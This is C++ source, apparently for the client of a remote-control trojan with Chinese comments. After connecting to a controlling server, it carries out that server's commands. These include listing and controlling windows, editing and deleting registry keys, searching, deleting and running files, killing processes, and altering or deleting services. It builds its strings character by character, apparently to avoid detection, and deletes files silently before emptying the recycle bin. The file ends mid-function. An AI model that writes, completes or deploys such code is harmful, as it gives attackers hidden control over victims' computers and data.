// MyAdminTrans.cpp: implementation of the CMyMainTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyMainTrans.h"
#include "MyDownTrans.h"
#include "MyClientMain.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyMainTrans::CMyMainTrans()
{
	//%08x.tmp
	char m_TempStr[256] = {0};
	m_TempStr[0] = '%';
	m_TempStr[1] = '0';
	m_TempStr[2] = '8';
	m_TempStr[3] = 'x';
	m_TempStr[4] = '.';
	m_TempStr[5] = 't';
	m_TempStr[6] = 'm';
	m_TempStr[7] = 'p';
	m_TempStr[8] = 0x00;

	m_Command = 0;	
	m_dTransLen = 0;
	m_TransData = NULL;
	GetTempPath(250, m_TmpFilePath);
	wsprintf(m_TmpFilePath + lstrlen(m_TmpFilePath), m_TempStr, GetCurrentThreadId());
}

CMyMainTrans::~CMyMainTrans()
{
	Close();
	if(m_TransData != NULL)
	{
		delete [] m_TransData;
	}
	DeleteFile(m_TmpFilePath);
}

BOOL CMyMainTrans::StartWork(PSDLLINFO m_Info)
{
	//连接到服务器
	if(!Create(WM_CONNECT_FILE, m_Info))
	{
		return FALSE;
	}

	//开始任务
	while(1)
	{
		//接收命令
		if(!ReadBag())
		{
			break;
		}

		//归零命令
		UINT nCmd = m_Command;
		m_Command = 0;

		//命令处理
		switch(nCmd)
		{
			//枚举窗口
			case CLIENT_ENUM_WINDOWS :
				MyEnumWindows();
				break;

			//关闭窗口，最大化窗口，最小化窗口
			case CLIENT_CONTROL_WINDOWS :
				MyContrlWindows();
				break;

			//删除指定键值
			case CLIENT_REG_DELETE_VALUE :
				MyRegDeleteValue();
				break;

			//更改键值
			case CLIENT_REG_UPDATE_VALUE :
				MyRegEditValue();
				break;

			//取注册表子键值
			case CLIENT_REG_QUERY :
				MyRegEnumKey();
				break;

			//删除指定子键
			case CLIENT_REG_DELETE_KEY :
				MyRegDeleteKey();
				break;

			//新建目录
			case CLIENT_CREATE_DIR :	
				CreateDir();
				break;
			
			//显示目录内容
			case CLIENT_DIR_LIST :	
				GetDirList();
				break;

			//取磁盘列表
				case CLIENT_DISK_LIST :	
				GetDiskList();
				break;

			//查找指定文件
			case CLIENT_FIND_FILE :
				GetFindFileList();
				break;

			//目录信息
			case CLIENT_DIR_INFO	:	
				GetDirInfo();
				break;

			//文件信息
			case CLIENT_FILE_INFO	:	
				GetFileInfo();
				break;

			//磁盘信息
			case CLIENT_DISK_INFO	:	
				GetDiskInfo();
				break;

			//更名
			case CLIENT_RENAME		:	
				ReNameFile();
				break;

			//删除文件
			case CLIENT_FILE_DELETE	:	
				DeleteMyFile();
				break;

			//运行文件
			case CLIENT_EXEC_FILE	:	
				ExecFile();
				break;

			//取目录拷贝列表
			case CLIENT_DOWN_FILE_LIST :
				GetDownFileList();
				break;

			//杀进程
			case CLIENT_PROCESS_KILL:	
				KillOneProcess();
				break;
			
			//列举进程
			case CLIENT_PROCESS_LIST :
				GetProcessList();
				break;

			//列举服务
			case CLIENT_ENUM_SERVICES :
				EnumMyServices();
				break;

			//更新服务
			case CLIENT_CONFIG_SERVICES :
				ConfigMyServices();
				break;

			//控制服务
			case CLIENT_CONTROL_SERVICES :
				ControlMyServices();
				break;

			//删除服务 
			case CLIENT_DELETE_SERVICE :
				DeleteMyServices();
				break;

			default	:	
				m_Command = INVALID_COMMAND;
				break;
		}

		//发送数据
		if(!SendBag())
		{
			break;
		}
	}
	return TRUE;
}

void CMyMainTrans::DeleteMyFile()
{
	LPDIRFILELIST pItemData = (LPDIRFILELIST) m_TransData;
	for(DWORD i = 0; i < (m_dTransLen / sizeof(DIRFILELIST)); i++)
	{
		FileOpertion(pItemData->m_ItemPath, "", FO_DELETE);
		pItemData ++;
	}
	SHEmptyRecycleBin(NULL, NULL, SHERB_NOCONFIRMATION|SHERB_NOPROGRESSUI|SHERB_NOSOUND);
}

void CMyMainTrans::CreateDir()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	if(!CreateDirectory(pItem->m_FileName, NULL))
	{
		m_Command = CREATE_DIR_FAILE;
	}
}

void CMyMainTrans::ReNameFile()
{
	LPRENAMEFILEITEM pItem = (LPRENAMEFILEITEM) m_TransData;
	if(!MoveFile(pItem->m_OldFileName, pItem->m_NewFileName))
	{
		m_Command = RENAME_FAILE;
	}
}

void CMyMainTrans::GetFindFileList()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	TCHAR m_FileName[MAX_PATH] = {0};
	TCHAR *p = StrRChr(pItem->m_FileName, NULL, '\\');
	if(p == NULL)
	{
		m_Command = COMMAND_PARAM_ERR;
		return;
	}
	*p = 0;
	lstrcpy(m_FileName, p + 1);

	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}
	if(!FindFile(pItem->m_FileName, m_FileName, hFile))
	{
		m_Command = NOT_FIND_ANY_FILE;
	}
	CloseHandle(hFile);
}

void CMyMainTrans::FillDiskInfo(LPCTSTR pDiskName, DISKINFO& m_DiskInfo)
{
	lstrcpy(m_DiskInfo.m_Name, pDiskName);
	if(!GetDiskFreeSpaceEx(m_DiskInfo.m_Name, 
		(ULARGE_INTEGER*) &(m_DiskInfo.FreeBytesAvailable),
		(ULARGE_INTEGER*) &(m_DiskInfo.TotalNumberOfBytes),
		(ULARGE_INTEGER*) &(m_DiskInfo.TotalNumberOfFreeBytes)))
	{
		m_DiskInfo.TotalNumberOfBytes = 0;
		m_DiskInfo.FreeBytesAvailable = 0;
		m_DiskInfo.TotalNumberOfFreeBytes = 0;
	}

	DWORD MaximumComponentLength = 0;
	DWORD FileSystemFlags = 0;
	TCHAR m_DiskName[24] = {0};
	wsprintf(m_DiskName, "%s\\", pDiskName);
	GetVolumeInformation(m_DiskName, m_DiskInfo.m_Volume, 128, NULL,
		&MaximumComponentLength, &FileSystemFlags, m_DiskInfo.m_FileSys, 128);
	m_DiskInfo.m_DeviceType = GetDriveType(m_DiskName);
}

void CMyMainTrans::GetDiskInfo()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	DISKINFO m_DiskInfo = {0};
	FillDiskInfo(pItem->m_FileName, m_DiskInfo);
	m_dTransLen = sizeof(DISKINFO);
	CopyMemory(m_TransData, &m_DiskInfo, m_dTransLen);
	SaveDataToTmpFile();
}

void CMyMainTrans::GetDiskList()
{
	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}
	TCHAR m_DiskNameBuf[MAX_PATH] = {0};	
	DWORD nSize = GetLogicalDriveStrings(512, m_DiskNameBuf);
	for(DWORD i = 0; i < nSize; i += 4)
	{
		CharUpper(&m_DiskNameBuf[i]);
		if(m_DiskNameBuf[i] != 'A' && m_DiskNameBuf[i] != 'B')
		{
			DISKINFO m_DiskInfo = {0};
			FillDiskInfo(&m_DiskNameBuf[i], m_DiskInfo);
			DWORD nWriteLen = 0;
			WriteFile(hFile, &m_DiskInfo, sizeof(DISKINFO), &nWriteLen, NULL);
		}
	}
	CloseHandle(hFile);
}

void CMyMainTrans::SaveDirListInfo(HANDLE hFile, LPCTSTR pFilePath)
{
	DIRFILELIST m_Info = {0};
	lstrcpy(m_Info.m_ItemPath, pFilePath);
	if(!GetFileAttributesEx(pFilePath, GetFileExInfoStandard, &m_Info.m_FileData))
	{
		return;
	}
	DWORD nWriteLen = 0;
	WriteFile(hFile, &m_Info, sizeof(DIRFILELIST), &nWriteLen, NULL);
}

void CMyMainTrans::GetDirList()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;

	TCHAR m_DirFindName[MAX_PATH] = {0};
	TCHAR m_FindPath[MAX_PATH] = {0};
	lstrcpy(m_FindPath, pItem->m_FileName);
	wsprintf(m_DirFindName, "%s\\*.*", m_FindPath);
	
	WIN32_FIND_DATA m_FindData = {0};
	HANDLE hFind = FindFirstFile(m_DirFindName, &m_FindData);
	if(hFind == INVALID_HANDLE_VALUE)
	{
		m_Command = NOT_FIND_ANY_FILE;
		return;
	}

	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFind);
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}

	char m_TmpStr[256] = {0};
	m_TmpStr[0] = '%';
	m_TmpStr[1] = 's';
	m_TmpStr[2] = '\\';
	m_TmpStr[3] = '%';
	m_TmpStr[4] = 's';

	BOOL fFinished = FALSE;
	TCHAR m_FilePath[MAX_PATH] = {0};
	while(!fFinished)
	{
		if(StrCmp(m_FindData.cFileName, ".") != 0 && StrCmp(m_FindData.cFileName, "..") != 0)
		{
			wsprintf(m_FilePath, m_TmpStr, m_FindPath, m_FindData.cFileName);
			SaveDirListInfo(hFile, m_FilePath);
		}
		if(!FindNextFile(hFind, &m_FindData)) 
		{
			if(GetLastError() == ERROR_NO_MORE_FILES) 
			{ 
				fFinished = TRUE; 
			} 
			else 
			{ 
				//异常错误
				break; 
			} 
		}
	}
	FindClose(hFind);
	CloseHandle(hFile);
}

void CMyMainTrans::GetFileInfo()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	FILEINFO m_FileInfo = {0};
	lstrcpy(m_FileInfo.m_szFullName, pItem->m_FileName);
	if(!GetFileAttributesEx(pItem->m_FileName, GetFileExInfoStandard, &m_FileInfo.m_FileData))
	{
		m_Command = CAN_NOT_OPEN_FILE;
		return;
	}
	CopyMemory(m_TransData, &m_FileInfo, sizeof(FILEINFO));
	m_dTransLen = sizeof(FILEINFO);
	SaveDataToTmpFile();
}

void CMyMainTrans::GetDirInfo()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	DIRINFO m_DirInfo;
	m_DirInfo.m_AllFileSize = 0;
	m_DirInfo.m_DirCount = 0;
	m_DirInfo.m_FileCount = 0;
	lstrcpy(m_DirInfo.m_szFullName, pItem->m_FileName);
	if(!GetFileAttributesEx(pItem->m_FileName, GetFileExInfoStandard, &m_DirInfo.m_FileData))
	{
		m_Command = CAN_NOT_OPEN_FILE;
		return;
	}
	if(!FindDir(pItem->m_FileName, m_DirInfo.m_DirCount, m_DirInfo.m_FileCount, m_DirInfo.m_AllFileSize))
	{
		m_Command = CAN_NOT_OPEN_FILE;
		return;
	}
	m_dTransLen = sizeof(DIRINFO);
	CopyMemory(m_TransData, &m_DirInfo, m_dTransLen);
	SaveDataToTmpFile();
}

BOOL CMyMainTrans::FindDir(LPCTSTR m_ParentPath, int & DirCount,int & FileCount, ULONGLONG & AllFileSize)
{
	TCHAR m_DirFindName[MAX_PATH] = {0};
	TCHAR m_FindPath[MAX_PATH] = {0};
	lstrcpy(m_FindPath, m_ParentPath);
	wsprintf(m_DirFindName, "%s\\*.*", m_FindPath);
	
	WIN32_FIND_DATA m_FindData = {0};
	HANDLE hFind = FindFirstFile(m_DirFindName, &m_FindData);
	if(hFind == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	char m_TmpStr[256] = {0};
	m_TmpStr[0] = '%';
	m_TmpStr[1] = 's';
	m_TmpStr[2] = '\\';
	m_TmpStr[3] = '%';
	m_TmpStr[4] = 's';
	BOOL fFinished = FALSE;
	TCHAR m_FilePath[MAX_PATH] = {0};
	while(!fFinished)
	{
		if(StrCmp(m_FindData.cFileName, ".") != 0 && StrCmp(m_FindData.cFileName, ".."))
		{
			wsprintf(m_FilePath, m_TmpStr, m_FindPath, m_FindData.cFileName);
			if(m_FindData.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY)
			{
				//目录
				DirCount++;
				if(!FindDir(m_FilePath, DirCount, FileCount, AllFileSize))
				{
					return FALSE;
				}
			}
			else
			{
				//文件
				FileCount++;
				LARGE_INTEGER nFileSize;
				nFileSize.LowPart = m_FindData.nFileSizeLow;
				nFileSize.HighPart = m_FindData.nFileSizeHigh;
				AllFileSize += nFileSize.QuadPart;
			}
		}
		if(!FindNextFile(hFind, &m_FindData)) 
		{
			if(GetLastError() == ERROR_NO_MORE_FILES) 
			{ 
				fFinished = TRUE; 
			}
			else 
			{ 
				//异常错误
				FindClose(hFind);
				return FALSE; 
			} 
		}
	}
	FindClose(hFind);
	return TRUE;
}

void CMyMainTrans::ExecFile()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	ShellExecute(NULL, NULL, pItem->m_FileName, NULL, NULL, SW_SHOW);
}

BOOL CMyMainTrans::FindFile(LPCTSTR m_ParentPath, LPCTSTR FileName, HANDLE hFile)
{
	TCHAR m_FindName[MAX_PATH] = {0};
	lstrcpy(m_FindName, FileName);

	TCHAR m_DirFindName[MAX_PATH] = {0};
	TCHAR m_FindPath[MAX_PATH] = {0};
	lstrcpy(m_FindPath, m_ParentPath);
	wsprintf(m_DirFindName, "%s\\*.*", m_FindPath);
	
	WIN32_FIND_DATA m_FindData = {0};
	HANDLE hFind = FindFirstFile(m_DirFindName, &m_FindData);
	if(hFind == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	char m_TmpStr[256] = {0};
	m_TmpStr[0] = '%';
	m_TmpStr[1] = 's';
	m_TmpStr[2] = '\\';
	m_TmpStr[3] = '%';
	m_TmpStr[4] = 's';

	BOOL fFinished = FALSE;
	TCHAR m_FilePath[MAX_PATH] = {0};
	while(!fFinished)
	{
		if(StrCmp(m_FindData.cFileName, ".") != 0 && StrCmp(m_FindData.cFileName, ".."))
		{
			wsprintf(m_FilePath, m_TmpStr, m_FindPath, m_FindData.cFileName);
			if(m_FindData.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY)
			{
				//目录
				if(!FindFile(m_FilePath, FileName, hFile))
				{
					return FALSE;
				}
			}
			else
			{
				//* || *.*
				if(StrCmp(m_FindName, "*") == 0 || StrCmp(m_FindName, "*.*") == 0)
				{
					SaveDirListInfo(hFile, m_FilePath);
				}
				//*.查找
				else if(m_FindName[0] == '*' && m_FindName[1] == '.')
				{
					if(StrCmpI(m_FindName + 1, m_FindData.cFileName + lstrlen(m_FindData.cFileName) - lstrlen(m_FindName + 1)) == 0)
					{
						SaveDirListInfo(hFile, m_FilePath);
					}
				}
				//.*查找
				else if(m_FindName[lstrlen(m_FindName) - 2] == '.' && m_FindName[lstrlen(m_FindName) - 1] == '*')
				{
					//扩展名查找
					if(StrCmpNI(m_FindName, m_FindData.cFileName, lstrlen(m_FindName) - 2) == 0
						&& lstrlen(m_FindName) + 2 == lstrlen(m_FindData.cFileName))
					{
						SaveDirListInfo(hFile, m_FilePath);
					}
				}
				else if(StrCmpI(m_FindName, m_FindData.cFileName) == 0)
				{
					SaveDirListInfo(hFile, m_FilePath);
				}
			}
		}

		if(!FindNextFile(hFind, &m_FindData)) 
		{
			if(GetLastError() == ERROR_NO_MORE_FILES) 
			{ 
				fFinished = TRUE; 
			} 
			else 
			{ 
				//异常错误
				FindClose(hFind);
				return FALSE; 
			} 
		}
	}
	FindClose(hFind);
	return TRUE;
}

void CMyMainTrans::SaveCopyListInfo(HANDLE hFile, LPCTSTR pFilePath)
{
	WIN32_FILE_ATTRIBUTE_DATA m_FileData = {0};
	if(!GetFileAttributesEx(pFilePath, GetFileExInfoStandard, &m_FileData))
	{
		return;
	}
	CPFILEINFO m_Info = {0};
	m_Info.m_FileLen.HighPart = m_FileData.nFileSizeHigh;
	m_Info.m_FileLen.LowPart = m_FileData.nFileSizeLow;
	lstrcpy(m_Info.m_FileName, pFilePath);
	DWORD nWriteLen = 0;
	WriteFile(hFile, &m_Info, sizeof(CPFILEINFO), &nWriteLen, NULL);
}

void CMyMainTrans::GetDownFileList()
{
	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}

	LPDIRFILELIST pData = (LPDIRFILELIST) m_TransData;
	for(DWORD i = 0; i < m_dTransLen / sizeof(DIRFILELIST); i++)
	{
		if(pData->m_FileData.dwFileAttributes)
		{
			FindCopyFile(pData->m_ItemPath, hFile);
		}
		else
		{
			SaveCopyListInfo(hFile, pData->m_ItemPath);
		}	
		pData++;
	}
	CloseHandle(hFile);
}

BOOL CMyMainTrans::FindCopyFile(LPCTSTR m_ParentPath, HANDLE hFile)
{
	TCHAR m_DirFindName[MAX_PATH] = {0};
	TCHAR m_FindPath[MAX_PATH] = {0};
	lstrcpy(m_FindPath, m_ParentPath);
	wsprintf(m_DirFindName, "%s\\*.*", m_FindPath);
	
	WIN32_FIND_DATA m_FindData = {0};
	HANDLE hFind = FindFirstFile(m_DirFindName, &m_FindData);
	if(hFind == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	char m_TmpStr[256] = {0};
	m_TmpStr[0] = '%';
	m_TmpStr[1] = 's';
	m_TmpStr[2] = '\\';
	m_TmpStr[3] = '%';
	m_TmpStr[4] = 's';

	BOOL fFinished = FALSE;
	TCHAR m_FilePath[MAX_PATH] = {0};
	while(!fFinished)
	{
		if(StrCmp(m_FindData.cFileName, ".") != 0 && StrCmp(m_FindData.cFileName, ".."))
		{
			wsprintf(m_FilePath, m_TmpStr, m_FindPath, m_FindData.cFileName);
			if(m_FindData.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY)
			{
				//目录
				if(!FindCopyFile(m_FilePath, hFile))
				{
					return FALSE;
				}
			}
			else
			{
				//文件
				SaveCopyListInfo(hFile, m_FilePath);
			}
		
		}
		if(!FindNextFile(hFind, &m_FindData)) 
		{
			if(GetLastError() == ERROR_NO_MORE_FILES) 
			{ 
				fFinished = TRUE; 
			} 
			else 
			{ 
				//异常错误
				FindClose(hFind);
				return FALSE; 
			} 
		}
	}
	FindClose(hFind);
	return TRUE;
}

BOOL WINAPI CMyMainTrans::FileOpertion(LPCTSTR szFileName1,LPCTSTR szFileName2,DWORD opt)
{ 
	SHFILEOPSTRUCT shf = {0}; 
	TCHAR sr[MAX_PATH] = {0}; 
	TCHAR de[MAX_PATH] = {0};
	lstrcpy(sr, szFileName1); 
	lstrcpy(de, szFileName2); 
	ZeroMemory(&shf, sizeof(shf)); 
	shf.hwnd = NULL;
	shf.wFunc = opt; 
	shf.pFrom = sr; 
	shf.pTo = de; 
	shf.fFlags = FOF_SILENT|FOF_FILESONLY|FOF_MULTIDESTFILES|FOF_NOCONFIRMATION|FOF_NOCONFIRMMKDIR; 
	return (!(SHFileOperation(&shf)));
} 

BOOL CALLBACK CMyMainTrans::EnumWindowsProc(HWND hWnd, LPARAM lParam)
{
	DWORD nPid = 0;
	GetWindowThreadProcessId(hWnd, &nPid);
	if(nPid == GetCurrentProcessId())
	{
		return TRUE;
	}

	TCHAR m_Title[MAX_PATH] = {0};
	GetWindowText(hWnd, m_Title, 512);
	if(lstrlen(m_Title) > 0 && (StrCmp(m_Title, "") != 0) &&
	(StrCmp(m_Title, "M") != 0) && (StrCmp(m_Title, "Default IME") != 0))
	{
		WINDOWITEM m_Item = {0};
		m_Item.m_hWnd = hWnd;
		lstrcpy(m_Item.m_WndName, m_Title);
		MyMainFunc::GetMoudleMame(nPid, m_Item.m_ProcName);
		DWORD nWriteLen = 0;
		WriteFile((HANDLE) lParam, &m_Item, sizeof(WINDOWITEM), &nWriteLen, NULL);
	}
	return TRUE;
}

void CMyMainTrans::MyEnumWindows()
{
	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}
	
	HDESK hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	HDESK hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	if(hNewDesktop != NULL)
	{
		SetThreadDesktop(hNewDesktop);
	}
	EnumWindows(EnumWindowsProc, (LPARAM) hFile);
	SetThreadDesktop(hOldDesktop);
	CloseHandle(hFile);
}

void CMyMainTrans::MyContrlWindows()
{
	LPWINDOWITEM pItem = (LPWINDOWITEM) m_TransData;

	HDESK hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	HDESK hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	if(hNewDesktop != NULL)
	{
		SetThreadDesktop(hNewDesktop);
	}
	switch(pItem->m_CtrlType)
	{
		case WM_CLOSE	: PostMessage(pItem->m_hWnd, WM_CLOSE, 0, 0); break;
		default		: ShowWindow(pItem->m_hWnd, pItem->m_CtrlType); break;
	}
	if(pItem->m_CtrlType == SW_SHOWMAXIMIZED || pItem->m_CtrlType == SW_SHOW)
	{
		BringWindowToTop(pItem->m_hWnd);
		UpdateWindow(pItem->m_hWnd);
	}
	SetThreadDesktop(hOldDesktop);
}

void CMyMainTrans::GetProcessList()
{
	HANDLE m_Sys = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	if(m_Sys == NULL)
	{
		m_Command = GET_PROCESS_LIST_ERR;
		return;
	}

	PROCESSENTRY32 m_Lppe = {0};
	m_Lppe.dwSize = sizeof(PROCESSENTRY32);
	if(!Process32First(m_Sys,&m_Lppe))
	{
		m_Command = GET_PROCESS_LIST_ERR;
		CloseHandle(m_Sys);
		return;
	}
	
	MyMainFunc::GetMyToken();

	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}

	PROCESSLIST m_ProcessList = {0};
	m_ProcessList.cntThreads = m_Lppe.cntThreads;
	m_ProcessList.pcPriClassBase = m_Lppe.pcPriClassBase;
	m_ProcessList.th32ProcessID = m_Lppe.th32ProcessID;
	lstrcpy(m_ProcessList.szExeFile,m_Lppe.szExeFile);
	if(StrRChr(m_ProcessList.szExeFile, NULL, '\\') == NULL)
	{
		MyMainFunc::GetMoudleMame(m_ProcessList.th32ProcessID, m_ProcessList.szExeFile);
	}

	DWORD nWriteLen = 0;
	WriteFile(hFile, &m_ProcessList, sizeof(PROCESSLIST), &nWriteLen, NULL);
	while(Process32Next(m_Sys,&m_Lppe))
	{
		ZeroMemory(&m_ProcessList, sizeof(PROCESSLIST));
		m_ProcessList.cntThreads = m_Lppe.cntThreads;
		m_ProcessList.pcPriClassBase = m_Lppe.pcPriClassBase;
		m_ProcessList.th32ProcessID = m_Lppe.th32ProcessID;
		lstrcpy(m_ProcessList.szExeFile,m_Lppe.szExeFile);
		if(StrRChr(m_ProcessList.szExeFile, NULL, '\\') == NULL)
		{
			MyMainFunc::GetMoudleMame(m_ProcessList.th32ProcessID, m_ProcessList.szExeFile);
		}
		WriteFile(hFile, &m_ProcessList, sizeof(PROCESSLIST), &nWriteLen, NULL);
	}
	CloseHandle(hFile);
	CloseHandle(m_Sys);
}

void CMyMainTrans::KillOneProcess()
{
	LPPATHFILEITEM pItem = (LPPATHFILEITEM) m_TransData;
	DWORD m_ProcessId = StrToInt(pItem->m_FileName);

	MyMainFunc::GetMyToken();
	HANDLE m_Kill = OpenProcess(PROCESS_TERMINATE, FALSE, m_ProcessId);
	if(m_Kill == NULL)
	{
		//终止进程失败
		m_Command = KILL_PROCESS_ERR;
		return;
	}
	if(!TerminateProcess(m_Kill,0))
	{
		//终止进程失败
		m_Command = KILL_PROCESS_ERR;
		CloseHandle(m_Kill);
		return;
	}
	CloseHandle(m_Kill);
}

void CMyMainTrans::ConfigMyServices()
{
	MyMainFunc::GetMyToken();

	SC_HANDLE hMana = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS|
		GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE);
	if(hMana == NULL)
	{
		m_Command = CONFIG_SERVICES_FAIL;
		return;
	}
	LPMYSERVICES pServices = (LPMYSERVICES) m_TransData;
	SC_HANDLE hServices = OpenService(hMana, pServices->m_Name,SERVICE_ALL_ACCESS);
	if(hServices == NULL)
	{
		CloseServiceHandle(hMana);
		m_Command = CONTROL_SERVICES_FAIL;
		return;
	}
	if(!ChangeServiceConfig(hServices, SERVICE_NO_CHANGE,
		pServices->dwStartType, SERVICE_NO_CHANGE ,
		NULL, NULL, NULL, NULL, NULL, NULL, pServices->m_Disp))
	{
		CloseServiceHandle(hServices);
		CloseServiceHandle(hMana);
		m_Command = CONTROL_SERVICES_FAIL;
		return;
	}
	CloseServiceHandle(hServices);
	CloseServiceHandle(hMana);
	m_Command = 0;
}

void CMyMainTrans::ControlMyServices()
{
	LPCONTROLSERVICES pItem = (LPCONTROLSERVICES) m_TransData;

	MyMainFunc::GetMyToken();

	SC_HANDLE hMana = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS|
		GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE);
	if(hMana == NULL)
	{
		m_Command = CONTROL_SERVICES_FAIL;
		return;
	}

	SC_HANDLE hServices = OpenService(hMana, pItem->m_Name, SERVICE_ALL_ACCESS);
	if(hServices == NULL)
	{
		CloseServiceHandle(hMana);
		m_Command = CONTROL_SERVICES_FAIL;
		return;
	}

	BOOL ret = FALSE;
	SERVICE_STATUS m_Status = {0};
	switch(pItem->m_Flag)
	{
		case 0	: ret = StartService(hServices, NULL, 0); break;
		case 1	: ret = ControlService(hServices, SERVICE_CONTROL_STOP, &m_Status); break;
		default	: break;
	}
	if(ret)
	{
		m_Command = 0;
	}
	else
	{
		m_Command = CONTROL_SERVICES_FAIL;
	}
	CloseServiceHandle(hServices);
	CloseServiceHandle(hMana);
}

void CMyMainTrans::DeleteMyServices()
{
	LPCONTROLSERVICES pItem = (LPCONTROLSERVICES) m_TransData;

	MyMainFunc::GetMyToken();
	SC_HANDLE hMana = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS|
		GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE);
	if(hMana == NULL)
	{
		m_Command = SERVICE_DELETE_ERR;
		return;
	}

	SC_HANDLE hServices = OpenService(hMana, pItem->m_Name, SERVICE_ALL_ACCESS);
	if(hServices == NULL)
	{
		CloseServiceHandle(hMana);
		m_Command = SERVICE_DELETE_ERR;
		return;
	}
	BOOL ret = DeleteService(hServices);
	CloseServiceHandle(hServices);
	CloseServiceHandle(hMana);
	if(!ret) 
	{
		m_Command = SERVICE_DELETE_ERR;
	}
}

void CMyMainTrans::EnumMyServices()
{
	MyMainFunc::GetMyToken();

	SC_HANDLE hMana = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS|
		GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE);
	if(hMana == NULL)
	{
		m_Command = ENUM_SERVICES_FAIL;
		return;
	}

	DWORD m_ByteNeed = 0;
	DWORD m_Count = 0;
	DWORD NextEntry = 0;
	BYTE *m_TmpBuf = new BYTE[65535];
	if(!EnumServicesStatus(hMana, SERVICE_WIN32,
		SERVICE_STATE_ALL, (LPENUM_SERVICE_STATUS) m_TmpBuf,
		65534, &m_ByteNeed, &m_Count, &NextEntry))
	{
		delete [] m_TmpBuf;
		CloseServiceHandle(hMana);
		m_Command = ENUM_SERVICES_FAIL;
		return;
	}

	HANDLE hFile = OpenMyTmpFile();
	if(hFile == INVALID_HANDLE_VALUE)
	{
		delete [] m_TmpBuf;
		m_Command = CAN_NOT_CREATE_TMP_FILE;
		return;
	}

	MYSERVICES m_Services = {0};
	LPENUM_SERVICE_STATUS pStauts = (LPENUM_SERVICE_STATUS) m_TmpBuf;
	for(DWORD i = 0; i < m_Count; i++)
	{
		ZeroMemory(&m_Services,sizeof(MYSERVICES));
		lstrcpy(m_Services.m_Name,pStauts[i].lpServiceName);
		lstrcpy(m_Services.m_Disp,pStauts[i].lpDisplayName);
		*((DWORD*) m_Services.m_Status) = pStauts[i].ServiceStatus.dwCurrentState;
		GetServicesConfig(hMana,&m_Services);
		DWORD nWriteLen = 0; 
		WriteFile(hFile, &m_Services, sizeof(MYSERVICES), &nWriteLen, NULL);
	}
	CloseHandle(hFile);
	delete [] m_TmpBuf;
	CloseServiceHandle(hMana);
}

void CMyMainTrans::GetServicesConfig(SC_HANDLE hMana,LPMYSERVICES pServices)
{
	SC_HANDLE hServices = OpenService(hMana, pServices->m_Name, SERVICE_ALL_ACCESS);
	if(hServices == NULL) 
	{
		return;
	}

	//SYSTEM\\ControlSet001\\Services\\%s
	char m_TempStr[256] = {0};
	m_TempStr[0] = 'S';
	m_TempStr[1] = 'Y';
	m_TempStr[2] = 'S';
	m_TempStr[3] = 'T';
	m_TempStr[4] = 'E';
	m_TempStr[5] = 'M';
	m_TempStr[6] = '\\';
	m_TempStr[7] = 'C';
	m_TempStr[8] = 'o';
	m_TempStr[9] = 'n';
	m_TempStr[10] = 't';
	m_TempStr[11] = 'r';
	m_TempStr[12] = 'o';
	m_TempStr[13] = 'l';
	m_TempStr[14] = 'S';
	m_TempStr[15] = 'e';
	m_TempStr[16] = 't';
	m_TempStr[17] = '0';
	m_TempStr[18] = '0';
	m_TempStr[19] = '1';
	m_TempStr[20] = '\\';
	m_TempStr[21] = 'S';
	m_TempStr[22] = 'e';
	m_TempStr[23] = 'r';
	m_TempStr[24] = 'v';
	m_TempStr[25] = 'i';
	m_TempStr[26] = 'c';
	m_TempStr[27] = 'e';
	m_TempStr[28] = 's';
	m_TempStr[29] = '\\';
	m_TempStr[30] = '%';
	m_TempStr[31] = 's';
	m_TempStr[32] = 0x00;


	DWORD m_NeedLen = 0;
	BYTE *pData = new BYTE[8192];
	ZeroMemory(pData,8192);
	LPQUERY_SERVICE_CONFIG pConFig = (LPQUERY_SERVICE_CONFIG) pData;
	if(QueryServiceConfig(hServices, pConFig, 8192, &m_NeedLen))
	{
		pServices->dwErrorControl = pConFig->dwErrorControl;
